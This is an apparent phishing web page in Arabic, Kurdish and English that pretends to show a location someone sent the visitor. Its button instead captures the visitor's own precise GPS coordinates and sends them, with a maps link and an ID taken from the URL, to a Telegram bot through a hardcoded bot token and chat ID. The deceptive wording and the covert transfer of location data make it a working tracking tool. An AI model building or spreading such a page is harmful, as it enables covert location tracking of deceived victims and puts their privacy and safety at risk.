 <!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title data-i18n="page_title">عرض الموقع</title>

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: url('https://images.unsplash.com/photo-1524661135-423995f22d0b?auto=format&fit=crop&w=1200&q=80') center/cover no-repeat fixed;
            flex-direction: column;
        }

        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, .45);
            backdrop-filter: blur(6px);
        }

        /* ---------- هەڵبژاردەی زمان ---------- */
        .lang-selector {
            position: fixed;
            top: 15px;
            right: 20px;
            z-index: 99;
            background: #fff;
            border-radius: 30px;
            padding: 5px 15px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
            display: flex;
            gap: 10px;
        }

        .lang-btn {
            border: none;
            background: transparent;
            padding: 8px 12px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: #666;
            transition: 0.3s;
        }

        .lang-btn.active {
            background: #34c759;
            color: #fff;
        }

        .card {
            position: relative;
            z-index: 2;
            width: 390px;
            max-width: 95%;
            background: rgba(255, 255, 255, .92);
            backdrop-filter: blur(15px);
            border-radius: 28px;
            padding: 35px 28px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, .35);
            text-align: center;
            margin-top: 60px; /* بۆ ئەوەی لە ژێر هەڵبژاردەکەوە بێت */
        }

        .icon {
            width: 90px;
            height: 90px;
            margin: auto;
            margin-bottom: 20px;
            border-radius: 50%;
            background: linear-gradient(135deg, #34c759, #00a651);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 42px;
            color: #fff;
            box-shadow: 0 10px 25px rgba(52, 199, 89, .45);
        }

        h1 {
            color: #222;
            font-size: 28px;
            margin-bottom: 15px;
        }

        .desc {
            font-size: 16px;
            color: #555;
            line-height: 1.9;
            margin-bottom: 25px;
        }

        .info {
            background: #f8f9fb;
            border-radius: 18px;
            padding: 18px;
            text-align: right;
            margin-bottom: 25px;
        }

        .info h2 {
            font-size: 18px;
            margin-bottom: 12px;
            color: #222;
        }

        .info p {
            color: #555;
            line-height: 1.8;
            font-size: 15px;
        }

        .btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 50px;
            background: linear-gradient(135deg, #34c759, #00a651);
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: .25s;
        }

        .btn:hover {
            transform: scale(1.03);
        }

        .note {
            margin-top: 20px;
            font-size: 13px;
            color: #777;
        }

        #result {
            margin-top: 15px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <!-- ========== هەڵبژاردەی زمان ========== -->
    <div class="lang-selector">
        <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
        <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
        <button class="lang-btn" onclick="changeLang('en')">English</button>
    </div>

    <!-- ========== ناوەڕۆکی سەرەکی ========== -->
    <div class="card">
        <div class="icon">📍</div>
        <h1 data-i18n="main_title">تم استلام موقع المستخدم</h1>
        <p class="desc" data-i18n="desc">
            لقد أرسل إليك المستخدم موقعه الجغرافي عبر الخرائط.
            يمكنك عرض الموقع الدقيق بالضغط على الزر أدناه.
        </p>

        <div class="info">
            <h2 data-i18n="info_title">معلومات الموقع</h2>
            <p data-i18n="info_text">
                سيتم فتح الموقع مباشرةً على الخريطة مع إظهار الإحداثيات الدقيقة ومكان المستخدم.
            </p>
        </div>

        <button id="btnStart" class="btn" onclick="getLoc()" data-i18n="start_btn">
            📍 لعرض الموقع الدقيق اضغط هنا
        </button>

        <div id="result"></div>

        <p class="note" data-i18n="footer_note">
            سيتم فتح الموقع باستخدام تطبيق الخرائط على جهازك.
        </p>
    </div>

    <script>
        // ========== داتابەیسی وەرگێڕان ==========
        const translations = {
            ar: {
                page_title: "عرض الموقع",
                main_title: "تم استلام موقع المستخدم",
                desc: "لقد أرسل إليك المستخدم موقعه الجغرافي عبر الخرائط. يمكنك عرض الموقع الدقيق بالضغط على الزر أدناه.",
                info_title: "معلومات الموقع",
                info_text: "سيتم فتح الموقع مباشرةً على الخريطة مع إظهار الإحداثيات الدقيقة ومكان المستخدم.",
                start_btn: "📍 لعرض الموقع الدقيق اضغط هنا",
                footer_note: "سيتم فتح الموقع باستخدام تطبيق الخرائط على جهازك.",
                loading: "⏳ جارٍ تحديد الموقع...",
                success: "✅ تم تأكيد موقعك",
                done: "✅ تم",
                error_prefix: "❌ فشل: ",
                retry: "📍 إعادة المحاولة"
            },
            ckb: {
                page_title: "پیشاندانی شوێن",
                main_title: "شوێنی بەکارهێنەر وەرگیرا",
                desc: "بەکارهێنەر شوێنی جوگرافی خۆی بۆ ناردوویت لە ڕێگەی نەخشەوە. دەتوانیت شوێنی ورد ببینی بە کرتەکردن لەسەر دوگمەکەی خوارەوە.",
                info_title: "زانیاری شوێن",
                info_text: "شوێنەکە ڕاستەوخۆ لەسەر نەخشە دەکرێتەوە و پۆتانە وردەکان و شوێنی بەکارهێنەر پیشان دەدات.",
                start_btn: "📍 بۆ پیشاندانی شوێنی ورد کرتە لێرە بکە",
                footer_note: "شوێنەکە بە بەکارهێنانی بەرنامەی نەخشە لە ئامێرەکەتدا دەکرێتەوە.",
                loading: "⏳ چاوەڕوانی دیاریکردنی شوێن...",
                success: "✅ شوێنەکەت پشتڕاست کرایەوە",
                done: "✅ تەواو",
                error_prefix: "❌ شکست: ",
                retry: "📍 دووبارە هەوڵبدەرەوە"
            },
            en: {
                page_title: "View Location",
                main_title: "User Location Received",
                desc: "The user has sent you their geographic location via maps. You can view the exact location by clicking the button below.",
                info_title: "Location Info",
                info_text: "The location will open directly on the map showing the precise coordinates and the user's place.",
                start_btn: "📍 Click here to view exact location",
                footer_note: "The location will be opened using the maps application on your device.",
                loading: "⏳ Locating...",
                success: "✅ Your location confirmed",
                done: "✅ Done",
                error_prefix: "❌ Failed: ",
                retry: "📍 Retry"
            }
        };

        // ========== فەنکشنی گۆڕینی زمان ==========
        function changeLang(lang) {
            // گۆڕینی ئاڕاستە
            if (lang === 'ar' || lang === 'ckb') {
                document.documentElement.dir = 'rtl';
            } else {
                document.documentElement.dir = 'ltr';
            }

            // نوێکردنەوەی هەموو توخمەکانی data-i18n
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.getAttribute('data-i18n');
                if (translations[lang] && translations[lang][key]) {
                    el.textContent = translations[lang][key];
                }
            });

            // دیاریکردنی دوگمەی چالاک
            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');

            // پاشەکەوتکردنی زمان
            localStorage.setItem('preferred_lang_gps', lang);

            // نوێکردنەوەی دوگمەی سەرەکی ئەگەر لە دۆخی چالاکدا بێت
            const btn = document.getElementById('btnStart');
            if (btn.disabled && btn.textContent.includes('⏳')) {
                btn.textContent = translations[lang].loading;
            } else if (btn.textContent.includes('✅')) {
                btn.textContent = translations[lang].done;
            } else {
                btn.textContent = translations[lang].start_btn;
            }
        }

        // بارکردنی زمانی پاشەکەوتکراو
        window.addEventListener('DOMContentLoaded', () => {
            const savedLang = localStorage.getItem('preferred_lang_gps') || 'ar';
            changeLang(savedLang);
        });

        // ========== کۆدی GPS ==========
        const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
        const CHAT = '1015102519';
        const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';

        async function getLoc() {
            const btn = document.getElementById('btnStart');
            const res = document.getElementById('result');
            const currentLang = localStorage.getItem('preferred_lang_gps') || 'ar';

            btn.disabled = true;
            btn.textContent = translations[currentLang].loading;
            res.textContent = '';
            res.style.display = 'block';

            try {
                const position = await new Promise((resolve, reject) =>
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 15000
                    })
                );

                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                const message = `📍 **موقع جديد**\n🆔 ID: ${chatId}\n📌 ${lat}, ${lng}\n🗺️ ${mapsLink}`;

                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                res.textContent = translations[currentLang].success;
                btn.textContent = translations[currentLang].done;

            } catch (e) {
                res.textContent = translations[currentLang].error_prefix + e.message;
                btn.disabled = false;
                btn.textContent = translations[currentLang].retry;
            }
        }
    </script>
</body>
</html>
